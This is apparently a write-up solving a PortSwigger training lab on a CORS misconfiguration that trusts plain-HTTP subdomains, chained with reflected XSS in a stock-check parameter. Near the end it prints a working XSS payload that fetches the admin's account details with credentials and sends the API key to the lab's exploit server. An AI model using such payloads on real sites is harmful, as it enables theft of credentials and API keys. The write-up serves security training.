## Lab Description: CORS vulnerability with trusted insecure protocols

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/c09efc2a-1f88-440f-83d0-a118a237eed2)


## Solution:

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
```
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```
The application responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```
In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:

The victim user makes any plain HTTP request.

The attacker injects a redirection to:
```
http://trusted-subdomain.vulnerable-website.com
```
The victim's browser follows the redirect.

The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:
```
https://vulnerable-website.com
```
The victim's browser makes the CORS request, including the origin:
```
http://trusted-subdomain.vulnerable-website.com
```
The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.

The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.


When we give Origin: evil.com or Origin: null , we don't see any ACAO header in the response.

But when we give Origin : http://subdomain.lab-domain.com, we get the Access-Control-Allow-Origin in the response. [Note that we gave http instead of https]


![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/62f7fec3-7e2e-4cc9-8373-8b29570acce4)

So if we provide subdoamin of the website along with http insecure protocol, we are able to bypass the whitelist.

Finding an XSS -
In real life cases, if an attacker performs a MITM attack , then he can exploit the CORS configuration to compromise the victim's interaction with the application. But in this lab we can't perform MITM attacks.

So the other way around to steal Administrator's API keys is by exploiting an XSS vulnearbility.

When we click on checkstock, we are taken to a new tab to display the result.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/a04ce8ee-af17-45b7-801b-9e3bf82c85ca)

If we enter a simple alert() script in productID parameter, we get a pop up which confirms that it is vulnerable to XSS.


![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/019d0a65-bc71-4bdd-b36d-4114b4098598)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/ccb7aa69-bccf-433e-9cd0-4f5b700e6c43)

Go to exploit server and enter the following XSS payload to steal the API key of admin.

      <script> document.location="http://stock.0a720027042deb43808f7670001f0067.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a720027042deb43808f7670001f0067.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ae200ca0459eb4d800375f301f000eb.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1" </script>

Deliver the exploit to victim & view AccessLog , there we will find the API key of admin in the URL portion.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/8035fc90-a56c-46e5-a32c-ab5f32eae072)

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/5ffef2aa-01fe-4b8f-b112-358ba6fead6c)
